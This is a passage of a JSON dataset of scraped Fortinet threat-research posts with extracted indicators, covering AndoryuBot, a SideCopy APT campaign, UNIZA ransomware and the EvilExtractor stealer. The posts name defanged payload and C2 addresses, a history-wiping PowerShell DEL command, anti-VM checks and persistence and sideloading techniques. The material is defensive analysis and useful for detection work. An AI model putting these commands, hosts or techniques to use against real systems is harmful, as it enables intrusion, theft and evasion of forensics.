          "7c9e6d63bc1f26e9c8a8703439e12de12da9892f2d6cd9bda5f45ec00c98a29f",
          "0ad68d5804804c25a6f6f3d87cc3a3886583f69b7115ba01ab7c6dd96a186404",
          "912e151641f20f9d689c6ea26cf6f11d5ee0b6fdc4d4a1179fac413391748c65",
          "f06d698967cee77e5a7bf9835b0a93394097e7590c156ed0d8c6304345701cfa",
          "95aa6882f5ea5a892ef832ef15dea77261394a7fec6db9d91267d40f1cf2bfa5",
          "bd87ac780e574ae8415907f88a3b48af578bb269308b56826e2f33438559e4b7",
          "3296598c79748322dfff8eb786705d048725c04b23dd3a293f52a1acafe9e7ae",
          "6c034ff9b5447da62822e3231e5e2d5db225756b3e216f6fc469469cb1d81813"
        ],
        "cve": [],
        "email": [],
        "url": [
          "https://www.youtube.com/watch?v=4fm_ZZn5qaw"
        ]
      },
      "threat_score": 0.370187561697927
    }
  },
  {
    "id": "Fortinet_54869",
    "source": "Fortinet",
    "title": "AndoryuBot – New Botnet Campaign Targets Ruckus Wireless Admin Remote Code Execution Vulnerability (CVE-2023-25717)",
    "text": "FortiGuard Labs Threat Research Affected platforms:LinuxImpacted parties:Any organizationImpact:Remote attackers gain control of vulnerable systemsSeverity level:Critical In April, FortiGuard Labs observed a unique botnet based on the SOCKS protocol distributed through the Ruckus vulnerability (CVE-2023-25717). This botnet, known as AndoryuBot, first appeared in February 2023. It contains DDoS attack modules for different protocols and communicates with its command-and-control server using SOCKS5 proxies. Based on our IPS signatures trigger count (Figure 1), this campaign started distributing the current version sometime after mid-April. This article details how this malware leverages the Ruckus vulnerability and examines its behavior once inside an infected device. AndoryuBot targets the Ruckus vulnerability to gain access to a device. It then downloads a script for further propagation. The complete script is shown in Figure 3, and the downloading URL is http[:]//163[.]123[.]142[.]146. The AndoryuBot variant in this analysis targets the following architectures: arm, m68k, mips, mpsl, sh4, spc, and x86. It is saved under the filename “Andoryu,” which is how the campaign name was derived. It also uses its downloading method, “curl”, as its file extension. In addition, although it has “.ppc” in the script, instead of a valid execution file, the link only contains the string “Invalid file bixxh axx boi”. AndoryuBot first checks the argument count—the assembly code is shown in Figure 4. Take the x86 file as an example: the original parameters are “Andoryu.10curl” and “ruckus”. It then decodes data from the “.rodata” section. Figure 5 shows part of the code. The encryption key, “0x2A41605D“, and the clear text are shown in Figure 6. After the execution, it prints the string, “Project Andoryu(12/30/2022). What color is your botnet !” in the console. Analysis indicates that this project began last year, which makes this quite a new botnet group. After initialization, AndoryuBot sends a GET request to extract the victim’s public IP address. The HTTP request to “api.ipify.org” has a hardcoded User-Agent string, shown in Figure 7. Then it starts a connection to its C2 server, 45[.]153[.]243[.]39[:]10333, using the SOCKS protocol. The code is shown in Figure 8. The first data sent from the compromised endpoint is shown in Figure 9. After its communication channel setup, the client waits for a command from the server to launch a DDoS attack. The functions are shown in Figure 10. AndoryuBot includes 12 methods: tcp-raw, tcp-socket, tcp-cnc, tcp-handshake, udp-plain, udp-game, udp-ovh, udp-raw, udp-vse, udp-dstat, udp-bypass, and icmp-echo. We can locate these from the decoded data in the previous section. Once the victim system receives the attack command, it starts a DDoS attack on a specific IP address and port number. One example of the DDoS attack traffic is shown below: Based on the above features from AndoryuBot, we found a YouTube video published on April 25 that gives a brief induction about “Andoryu Net”. The description of its attack methods found on its selling page in Telegram is shown in Figure 12. The names match the decoded data from the AndoryuBot sample we collected. The Andoryu project will likely continue to update its features to increase interest and sales. CVE-2023-25717 is a remote code execution vulnerability affecting multiple Ruckus wireless Access Point (AP) devices (FortiGuard Labs released athreat signal reportabout CVE-2023-25717 on April 28). Once a target device is compromised, AndoryuBot quickly spreads and begins communicating with its C2 server via the SOCKS protocol. In a very short time, it is updated with additional DDoS methods and awaits attack commands. Users should be aware of this new threat and actively apply patches on affected devices as soon as they become available. This malware is detected and blocked by FortiGuard Antivirus as: ELF/Andoryu. CBN!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR, and the Fortinet AntiVirus engine is a part of each of those solutions. Customers running current AntiVirus updates are protected. Fortinet has also released IPS signatures to proactively protect our customers from the threats contained in the exploit list. The FortiGuard Web Filtering Service blocks the C2 server. FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you think this or any other cybersecurity threat has impacted your organization, contact ourGlobal FortiGuard Incident Response Team. 163[.]123[.]142[.]146 45[.]153[.]243[.]39 ea064dd91d8d9e6036e99f5348e078c43f99fdf98500614bffb736c4b0fff408 f42c6cea4c47bf0cbef666a8052633ab85ab6ac5b99b7e31faa1e198c4dd1ee1 3441e88c80e82b933bb09e660d229d74f7b753a188700fe018e74c2db7b2aaa0 3c9998b8451022beee346f1afe18cab84e867b43c14ba9c7f04e5c559bfc4c3a b71b4f478479505f1bfb43663b4a4666ec98cd324acb16892ecb876ade5ca6f9 e740a0d2e42c09e912c43ecdc4dcbd8e92896ac3f725830d16aaa3eddf07fd5c 4fe4cff875ef7f8c29c95efe71b92ed31ed9f61eb8dfad448259295bd1080aca 2e7136f760f04b1ed7033251a14fef1be1e82ddcbff44dae30db12fe52e0a78a 1298da097b1c5bdce63f580e14e2c1b372c409476747356a8e9cfaf62b94513d 55e921a196c92c659305aa9de3edf6297803b60012f83967562a57547875fec1 vulnerabilities,botnet,linux FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/andoryubot-new-botnet-campaign-targets-ruckus-wireless-admin-remote-code-execution-vulnerability-cve-2023-25717",
      "scraped_at": "2025-07-20T13:57:11.234223",
      "indicators": {
        "ip_address": [],
        "domain": [
          "pi"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "1298da097b1c5bdce63f580e14e2c1b372c409476747356a8e9cfaf62b94513d",
          "b71b4f478479505f1bfb43663b4a4666ec98cd324acb16892ecb876ade5ca6f9",
          "2e7136f760f04b1ed7033251a14fef1be1e82ddcbff44dae30db12fe52e0a78a",
          "3441e88c80e82b933bb09e660d229d74f7b753a188700fe018e74c2db7b2aaa0",
          "f42c6cea4c47bf0cbef666a8052633ab85ab6ac5b99b7e31faa1e198c4dd1ee1",
          "4fe4cff875ef7f8c29c95efe71b92ed31ed9f61eb8dfad448259295bd1080aca",
          "ea064dd91d8d9e6036e99f5348e078c43f99fdf98500614bffb736c4b0fff408",
          "55e921a196c92c659305aa9de3edf6297803b60012f83967562a57547875fec1",
          "e740a0d2e42c09e912c43ecdc4dcbd8e92896ac3f725830d16aaa3eddf07fd5c",
          "3c9998b8451022beee346f1afe18cab84e867b43c14ba9c7f04e5c559bfc4c3a"
        ],
        "cve": [
          "CVE-2023-25717"
        ],
        "email": [],
        "url": []
      },
      "threat_score": 0.6340819022457068
    }
  },
  {
    "id": "Fortinet_96381",
    "source": "Fortinet",
    "title": "Clean Rooms, Nuclear Missiles, and SideCopy, Oh My!",
    "text": "FortiGuard Labs Threat Research Affected Platforms:WindowsImpacted Users:Windows usersImpact:Controls victim’s machine and collects sensitive informationSeverity Level:Medium Occasionally, FortiGuard Labs researchers come across a file name or e-mail subject that makes us sit up and take notice. Of course, it may turn out to be nothing. But every once in a while, one of these turns out to be incredibly interesting. We recently came across one such file that referenced an Indian state military research organization and an in-development nuclear missile. The file was meant to deploy malware with characteristics matching the APT group “SideCopy.” With activities dating back to at least 2019, this group has aligned its targeting with the goals and objectives of the Pakistani government. The SideCopy APT group is known to leverage similar TTPs (Tactics, Techniques, and Procedures)—and in some cases, utilizes the same infrastructures—as another Pakistan-based threat actor group known as “Transparent Tribe.” Some reports even claim that SideCopy is a subsidiary of Transparent Tribe. The group was allegedly named “SideCopy” because an infection chain they employed was copied from the long-time Indian threat actor group SideWinder in a likely attempt to make attribution more difficult. Although SideCopy primarily targets Windows platforms, some reports indicate they have deployed malware to compromised Mac and Linux machines. The initial infection vector is suspected to be a phishing e-mail. However, that information was not available to FortiGuard Labs at the time of our investigation. That said, we do have access to a Zip file that would have been the likely attachment to an e-mail. The file is named “DRDO-K4-Missile-Clean-room.zip”. When the name’s meaning is fully parsed, it becomes quite interesting. “DRDO” refers to India’s Defence Research and Development Organisation (https://en.wikipedia.org/wiki/Defence_Research_and_Development_Organisation). “K-4” refers to the intermediate-range SLBMs (Submarine-Launched Ballistic Missiles) housed in their Arihant class of nuclear-powered ballistic missile submarines (https://en.wikipedia.org/wiki/K-4_(missile)). And “clean room” refers to the facility required to assemble sensitive components or perform intensive maintenance on these missiles. The Zip file contains three files, with two of them meant to be deployed in a subdirectory of the extraction location. The “office.template.mac” and “office.template.ui” files appear to contain unformatted data and have no bearing on the infection chain. They seem to function as decoys to make the third file, “DRDO-K4 Missile Clean room.pptx.lnk”, appear more legitimate. This is a Microsoft Windows shortcut file. On any Windows system with file extensions hidden, the “.lnk” extension would not be visible, making it appear as “DRDO-K4 Missile Clean room.pptx”. This deception makes it more difficult to distinguish the file as malicious simply by looking at it. The Windows shortcut file does not open a PowerPoint file (at least immediately). Instead, it reaches out to a domain controlled by the attacker using the utility for Microsoft HTML Applications (HTAs), or “mshta.exe”. In this case, the command line argument points to a URL. At the other end of the URL is a malicious file, “Pantomime.hta”, that will be downloaded and executed: hXXp://cornerstonebeverly[.]org/js/files/docufentososo/doecumentosoneso/pantomime[.]hta. Previous SideCopy incidents have been observed to useCACTUSTORCHto deploy code in an obfuscated manner via JavaScript and VBScript. This campaign appears to differ because the payload here seems to have been created using a tool called SILENTTRINITY. SILENTTRINITYis a newer, more comprehensive tool that can be used as a fully featured post-exploitation framework in the same vein as Empire or CobaltStrike. It effectively allows the execution of Microsoft . Net code without using PowerShell as an intermediary step. In this case, it appears that the payload was generated using the tool. However, it is unknown whether the backend that served this file or its subsequent stages used it. “Pantomime.hta” contains several sections of note. The head of the file validates the . Net version installed on the victim machine and verifies whether the folder “C:\\ProgramData\\HP” is present. If not, it will create it. Most of the rest of the file is dominated by two encoded sections stored in variables “dividAndRule” and “punctureTyres”. Both are base 64 encoded, albeit in slightly different ways. It’s helpful to start with the second section first, as it has to be read first for the code to be executed properly. As Figure 6 shows, “punctureTyres” is passed to the function “basforsixfourstream” (as shown in Figure 5), which decodes it from base64. The newly decoded “punctureTyres” is deserialized (read into a memory stream), where it can be executed. Contained within this stream is a Microsoft . Net library named “hta.dll”. It includes a function called “RealityShow” that is used to pass the base64-encoded variable “dividAndRule” so the file “DRDO-K4 Missile Clean room.pptx” can be deployed as well as the next stage of the malware. As mentioned, “hta.dll” aims to deploy “DRDO-K4 Missile Clean room.pptx”. It can be deployed as well as the next stage of the malware. After being called from “Pantomime.hta”, the function “openthefile” takes the data from “dividAndRule”, decodes it from base64, and decompresses it due to it being a GZip compressed data stream. It then opens the file for display. Additionally, the function “getThirdStrike” is called to begin the next phase of infection. “getThirdStrike” establishes the download location for what will become the file “jquery.hta”. It then sends that on the function “runItOn” to reach out to “hXXp://cornerstonebeverly[.]org/js/files/ntfonts/jquery.txt” to download the file. “getThirdStrike” also assesses the antivirus situation on the victim machine and passes that information on via an HTTP POST through the “pkg.infinity” function, which will reach out to “hXXp://cornerstonebeverly.org/js/files/ntfonts/avena/”. Once all of this occurs, the execution of “jquery.hta” commences. Unlike the shortcut that shares its name, this is an actual Microsoft PowerPoint file. The PowerPoint deck contains 22 slides and is a convincing treatise on the requirements for building a cleanroom environment to suit the needs of a major aerospace project in that region of the globe. The file, however, is entirely benign and operates as a decoy to conceal other activities being undertaken. “jquery.hta” is very similar in structure and purpose to “Pantomime.hta”. It advances the infection by deploying additional files from multiple variables with encoded data. It seems to have also been created by SILENTTRINITY. The head of the file contains the function “decode_base64”, a custom implementation to decode base 64-encoded data that will be used later and a large, encoded section attached to a variable called “addle”. Like “Pantomime.hta”, this gets executed once the next section is decoded and executed. The variable “InMomemerandum” contains the base64-encoded data for another . Net DLL called “PreBot.dll”. The function “decode_base64” from Figure 12 is now being used to decode a small block of base64 text, “U2VsZWN0ICogRnJvbSBBbnRpVmlydXNQcm9kdWN0”. This translates to “Select * From AntiVirusProduct”, a Windows Management Instrumentation (WMI) query to obtain information on what type of antivirus product(s) may be installed on the system. Figure 14 shows that “InMomemerandum” will be sent to a function to decode it from base 64—in this case, the function “bazSixFerToStreeeemStranger”. It is then deserialized to run “PreBot.dll” in memory, after which point the data from the variable “addle” is passed to the function “PinkAgain”. The opening class declaration of “DraftingPad” contains the path destinations for the files remaining to be deployed for this attack. In addition to containing the desired landing locations for the remaining files, some additional base 64 encoded text is assigned to the variable “BatFileBytes”. The “PinkAgain” function takes the data passed from “jquery.hta” in the form of a base 64-encoded, GZip-compressed stream of bytes and the antivirus settings of the victim machine and route them to a function that will deal with them appropriately. The purpose of “test.bat” is to create a registry key called “Windows Update Schedule” in the “HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run” registry hive. The naming convention attempts to assist it in blending in as something that looks legitimate. This ensures that the file “C:\\Users\\Public\\hp\\cridviz.exe” is executed upon each system restart. Finally, “DUser.dll” is decompressed and deposited into its target location of “C:\\Users\\Public\\hp\\” alongside “cridviz.exe”. This contains the main code for a Remote Access Trojan (RAT) that will be used along with the aforementioned “credviz.exe” by having its code sideloaded (https://attack.mitre.org/techniques/T1574/002/) into it when it launches. The file “C:\\Users\\Public\\hp\\cridviz.exe” is copied from its usual location at either “C:\\Windows\\SysWOW64\\credwiz.exe” or “C:\\Windows\\System32\\credwiz.exe” (depending on the system’s architecture) to the above location with the filename slightly altered. “cridviz.exe” is the \"Credential Backup and Restore Wizard\" used as part of the Windows Credential Manager to provide a method for backing up and restoring saved credentials on the system. As mentioned previously, the SideCopy RAT doesn’t exist as a separate executable. It has to have assistance via another application to load its code into memory and execute it. In this case, it’s “cridviz.exe”. It uses sideloading to do this, which is to say that a dependency of the legitimate application is highjacked to allow the malicious code to load. This is done by dropping the malicious DLL “DUser.dll” in the directory with “cridviz.exe”. Interestingly, “DUser.dll” isn’t a direct dependency requirement. It is actually a requirement of two other libraries that “cridviz.exe” requires, “COMCTL32.dll” and “SHELL32.dll”. The result of doing this is that it makes tracing the source of the malicious code much more difficult. The end state for this attack is the deployment and execution of “DUser.dll”. As alluded to above, a legitimate version of this file normally resides in “C:\\Windows\\SysWOW64”. As shown in Figure 23, comparing the illegitimate and legitimate files indicates several differences. Notably, what’s available in the “File description” and “File version” fields, as well as the size of the files, with the malicious one being considerably smaller. Upon execution, “DUser.dll” reaches out to “hXXp://144[.]91[.]72[.]17:8080” as a command and control (C2) node to both send and receive to. The actions performed by the RAT use a distinctive user-agent string, “cpp-httplib/0.7”, making it stand out in traffic. It can communicate over TCP using raw sockets or via HTTP. The RAT can also perform other, less common HTTP verb-related operations, such as “PUT” and “PATCH”. The RAT can start other processes if instructed using the “CreateProcessW” Windows API call. This would be useful for launching additional payloads once a foothold on the target system has been achieved. A targeted campaign, where the attacker takes the time to create a lure relevant enough for a target to pursue, will always open more doors for an attacker. In this case, we saw SideCopy deliver one that would be of interest only to a small group of people in the Indian defense industry. Targets in this position would be of definite interest to the Government of Pakistan and any threat actors that align with its aims. Fortinet customers are already protected from this malware through FortiGuard’s Web Filtering, AntiVirus, FortiMail, FortiClient, and FortiEDR services, as follows: The following (AV) signature detects the malware samples mentioned in this blog The WebFiltering client blocks all network-based URIs. Fortinet has multiple solutions designed to help train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. We also suggest that organizations have their end users undergo our FREENSE training:NSE 1 – Information Security Awareness. It includes a module on Internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks. If you think this or any other cybersecurity threat has impacted your organization, contact ourGlobal FortiGuard Incident Response Team. File-based IOCs: DRDO-K4-Missile-Clean-room.zip 9aed0c5a047959ef38ec0555ccb647688c67557a6f8f60f691ab0ec096833cce office.template.mac bf34077c8b22759b28dcc458dc1b7bba3810c1c30b050b26a26e8d9f64e77971 office.template.ui c7753ffb7f66b0dfb05a24955324182cb92bbf41dd8fccb308c3f04d497a16da DRDO - K4 Missile Clean room.pptx.lnk a2e55cbd385971904abf619404be7ee8078ce9e3e46226d4d86d96ff31f6bb9a pantomime.hta e88835e21c431d00a9b465d2e8bed746b6369892e33be10bc7ebbda6e8185819 68ec4461653ae682eeace1bff583307ec521a3ee23873a991c031cc49dc8132f DRDO - K4 Missile Clean room.pptx b9514ed1566c8ce46ab5bfd665f8b997f2d5624740f298699df43bb108e08c4d 85faf414ed0ba9c58b9e7d4dc7388ba5597598c93b701d367d8382717fb485ec 1c2399674713d2a3fc19b841e979eed61d73d1b7ca8fd6f29ba95a41f5a7684d f0cc9b18ba32f95085d5f9a3539dc08832c19e7d3124a5febbdc3bae47deab24 cridviz.exe 17eabfb88a164aa95731f198bd69a7285cc7f64acd7c289062cd3979a4a2f5bf 865e041b41b9c370a4eed91a9a407bd44a94e16e236e07be05e87de319a4486c Network-based IOCs: cornerstonebeverly[.]org TLD for HTA file downloads hXXp://cornerstonebeverly[.]org/js/files/docufentososo/doecumentosoneso/pantomime[.]hta Further payload download hXXps://cornerstonebeverly[.]org/js/files/ntfonts/avena/ hXXp://cornerstonebeverly[.]org/js/files/ntfonts/jquery[.]txt Further payload download hXXp://144.91.72[.]17:8080/user_details hXXp://144.91.72[.]17:8080/streamcmd? AV=Unknown&OS=6.1.7601.17932&Vesrion=1&detail=Wfstzepn_Admin Extracted PDB Paths: E:\\Packers\\CyberLink\\Latest Source\\Multithread Protocol Architecture\\HTTP Arsanel\\Clinet\\app\\Release\\app.pdb windows,FortiGuards Labs,APT Campaign FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/clean-rooms-nuclear-missiles-and-sidecopy",
      "scraped_at": "2025-07-20T13:57:20.106247",
      "indicators": {
        "ip_address": [],
        "domain": [
          "ornerstonebeverly",
          "ta",
          "RDO-K4-Missile-Clean-room",
          "ttack",
          "OMCTL32",
          "ffice",
          "antomime",
          "est",
          "oom",
          "shta",
          "pp",
          "kg",
          "n",
          "query",
          "reBot",
          "User",
          "ridviz",
          "HELL32",
          "redwiz",
          "redviz"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "a2e55cbd385971904abf619404be7ee8078ce9e3e46226d4d86d96ff31f6bb9a",
          "1c2399674713d2a3fc19b841e979eed61d73d1b7ca8fd6f29ba95a41f5a7684d",
          "85faf414ed0ba9c58b9e7d4dc7388ba5597598c93b701d367d8382717fb485ec",
          "9aed0c5a047959ef38ec0555ccb647688c67557a6f8f60f691ab0ec096833cce",
          "68ec4461653ae682eeace1bff583307ec521a3ee23873a991c031cc49dc8132f",
          "c7753ffb7f66b0dfb05a24955324182cb92bbf41dd8fccb308c3f04d497a16da",
          "b9514ed1566c8ce46ab5bfd665f8b997f2d5624740f298699df43bb108e08c4d",
          "bf34077c8b22759b28dcc458dc1b7bba3810c1c30b050b26a26e8d9f64e77971",
          "865e041b41b9c370a4eed91a9a407bd44a94e16e236e07be05e87de319a4486c",
          "17eabfb88a164aa95731f198bd69a7285cc7f64acd7c289062cd3979a4a2f5bf",
          "e88835e21c431d00a9b465d2e8bed746b6369892e33be10bc7ebbda6e8185819",
          "f0cc9b18ba32f95085d5f9a3539dc08832c19e7d3124a5febbdc3bae47deab24"
        ],
        "cve": [],
        "email": [],
        "url": [
          "https://en.wikipedia.org/wiki/K",
          "https://attack.mitre.org/techniques/T1574/002/",
          "https://en.wikipedia.org/wiki/Defence_Research_and_Development_Organisation"
        ]
      },
      "threat_score": 0.5121703853955375
    }
  },
  {
    "id": "Fortinet_16214",
    "source": "Fortinet",
    "title": "Ransomware Roundup - UNIZA",
    "text": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This latest edition of the Ransomware Roundup covers the UNIZA ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High FortiGuard Labs recently came across a new ransomware variant called UNIZA. Like other ransomware variants, it encrypts files on victims’ machines in an attempt to extort money. It uses the Command Prompt (cmd.exe) window to display its ransom message, and interestingly, it does not append the filename of the files it encrypts, making it more difficult to determine which files have been impacted. Information on the infection vector used by the UNIZA ransomware threat actor is not currently available however, the likely attack vector is via email as many ransomware variants are distributed that way. At the time of this research, there is no indication that UNIZA ransomware is widespread. UNIZA ransomware is a typical ransomware that encrypts files on compromised machines and demands a ransom payment for recovering the affected files. The ransomware targets all directories and files found under %userprofile% and Desktop for file encryption. Figure 1 displays the ransomware encryption code. Elements of this image are as follows: Instead of dropping a ransom note, it launches the Command Prompt and the ransom note gradually shows up as if the attacker is remotely typing the message. This may be a scare tactic to make victims believe that the attacker can remotely control their machine. The ransom message asks victims to contact the attacker via TikTok and demands 20 Euros worth of Bitcoin. As the ransom fee is relatively low, we believe the UNIZA ransomware threat actor is targeting consumers. At the time of our research, theattacker’s Bitcoin wallethas not recorded a single transaction, which means that no victims have yet fallen prey to this ransomware. Fortinet customers are already protected from this malware variant through FortiGuard’s Web Filtering, AntiVirus, and FortiEDR services, as follows: FortiGuard Labs detects known UNIZA ransomware variants with the following AV signatures: The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. eefa1271d1a2a937d0baa3f0c7d904941151d6c8f915aed4dd51f10fa5d09b2a UNIZA ransomware d9a3f2ad7cfc6989cc4da117d5a4f8097362aad6b91391e89746d68d8d7aa29f UNIZA ransomware 9092ef0beeef1b147c13da3f3259f4a075f3bfb2414c39f9108395435ac9887c UNIZA ransomware Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aU. S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. Ransomware Roundup,ransomware,ransomware attack FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-uniza-coverage",
      "scraped_at": "2025-07-20T13:57:28.259827",
      "indicators": {
        "ip_address": [],
        "domain": [
          "md"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "9092ef0beeef1b147c13da3f3259f4a075f3bfb2414c39f9108395435ac9887c",
          "eefa1271d1a2a937d0baa3f0c7d904941151d6c8f915aed4dd51f10fa5d09b2a",
          "d9a3f2ad7cfc6989cc4da117d5a4f8097362aad6b91391e89746d68d8d7aa29f"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.6833712984054671
    }
  },
  {
    "id": "Fortinet_87072",
    "source": "Fortinet",
    "title": "EvilExtractor – All-in-One Stealer",
    "text": "FortiGuard Labs Threat Research Affected platforms:WindowsImpacted parties:Any organizationImpact:Controls victim’s device and collects sensitive informationSeverity level:Critical EvilExtractor (sometimes spelled Evil Extractor) is an attack tool designed to target Windows operating systems and extract data and files from endpoint devices. It includes several modules that all work via an FTP service. It was developed by a company named Kodex, which claims it is an educational tool. However, research conducted by FortiGuard Labs shows cybercriminals are actively using it as an info stealer. Based on our traffic source data to the host, evilextractor[.]com, malicious activity increased significantly in March 2023. FortiGuard Labs observed this malware in a phishing email campaign on 30 March, which we traced back to the samples included in this blog. It usually pretends to be a legitimate file, such as an Adobe PDF or Dropbox file, but once loaded, it begins to leverage PowerShell malicious activities. It also contains environment checking and Anti-VM functions. Its primary purpose seems to be to steal browser data and information from compromised endpoints and then upload it to the attacker’s FTP server. We recently reviewed a version of the malware that was injected into a victim’s system and, as part of that analysis, identified that most of its victims are located in Europe and America. The developer released its project in October 2022 (Figure 1) and has kept updating it to increase its stability and strengthen its module. This article will examine the initial attack method used to deliver EvilExtractor and its functions. The phishing email with the malicious attachment is shown in Figure 2. It is disguised as an account confirmation request. The attacker also tricks the victim by using an Adobe PDF icon for the decompressed file. The PE header is shown in Figure 3. The execution file is a Python program packaged by PyInstaller. We extracted it with pyinstxtractor and found that the “PYARMOR” string in its main code file “contain.pyc”, shown in Figure 4, is an obfuscating tool for Python script that makes the malware harder to be analyzed and detected. We extracted the key and iv from _pytransform.dll and decrypted the “contain.pyc” using AES-GCM. In addition to the Python program, we observed a . NET loader that can extract EvilExtractor. Figure 5 is part of the code. It contains Base64-encoded data, which is a PowerShell script. This execution file is generated from the tool “PS2EXE-GUI”, which can convert PowerShell scripts to EXE Files. After decrypting the pyc file, we get the primary code of EvilExtractor. It is a PowerShell script that contains the following modules: It first checks whether the system’s date is between 2022-11-09 and 2023-04-12. If not, it uses the following command to delete the data in PSReadline and terminate: DEL \\\"$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadline\\*\\\" -Force –Recurse It then compares the product model to see if it matches any of the following: VirtualBox, VMWare, Hyper-V, Parallels, Oracle VM VirtualBox, Citrix Hypervisor, QEMU, KVM, Proxmox VE, or Docker, as shown in Figure 6. It also checks the victim’s hostname against 187 names from VirusTotal machines or other scanner/virtual machines, as shown in Figure 7. After passing the environment check, EvilExtractor downloads three components from http://193[.]42[.]33[.]232 used for stealing data. These files are also Python programs that are obfuscated using PyArmor. The first is “KK2023.zip”, which is used for stealing browser data and saving it in the folder “IMP_Data”. It can extract cookies from Google Chrome, Microsoft Edge, Opera, and Firefox. It also collects browser history and passwords from the following browsers: The second file is “Confirm.zip”. It is a key logger that saves data in the “KeyLogs” folder. The last file, “MnMs.zip”, is a webcam extractor. Its corresponding code is shown in Figure 8. EvilExtractor also collects system information by PowerShell script, shown in Figure 9. Figure 10 shows the concatenated data in a text file called “Credentials.txt”. EvilExtractor downloads files with specific extensions from the Desktop and Download folders, including jpg, png, jpeg, mp4, mpeg, mp3, avi, txt, rtf, xlsx, docx, pptx, pdf, rar, zip, 7z, csv, xml, and html. It also uses the command “CopyFromScreen” to capture a screenshot. The code is shown in Figure 11. After EvilExtractor extracts all the data from the compromised endpoint, it uploads it to the attacker’s FTP server, shown in Figure 12. The developer of EvilExtractor also provides an FTP server for those who purchase its malware. EvilExtractor also has a ransomware function. It is called “Kodex Ransomware”, as shown in Figure 13. We extracted this PowerShell script from the . Net loader mentioned in the previous section, and the script for its ransomware is similar to the one for its stealer. It downloads “zzyy.zip” from evilextractor[.]com. Details of the unzipped file, a 7-zip standalone console, are shown in Figure 14. Figure 15 shows it leverages “7za.exe” to encrypt files with the parameter “-p”, which means zipping files with a password. It also generates a ransom-demanding message saved in “KodexRansom”, shown in Figure 16. EvilExtractor is being used as a comprehensive info stealer with multiple malicious features, including ransomware. Its PowerShell script can elude detection in a . NET loader or PyArmor. Within a very short time, its developer has updated several functions and increased its stability. This blog explains how threat actors launch an attack via phishing mail and what files are leveraged to extract the EvilExtracrtor PowerShell script. We also detailed what functions are included, what data can be collected by EvilExtractor, and how the Kodex Ransomware works. Users should be aware of this new info stealer and continue to be cautious about suspicious mail. The malware described in this report are detected and blocked by FortiGuard Antivirus as: W32/EvilExtractor. A!trW32/Infostealer. A!trW32/Keylogger. A!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR, and the Fortinet AntiVirus engine is a part of each of those solutions. Customers running current AntiVirus updates are protected. The FortiGuard Web Filtering Service blocks the malicious URL and IP address. If you think this or any other cybersecurity threat has impacted your organization, contact ourGlobal FortiGuard Incident Response Team. 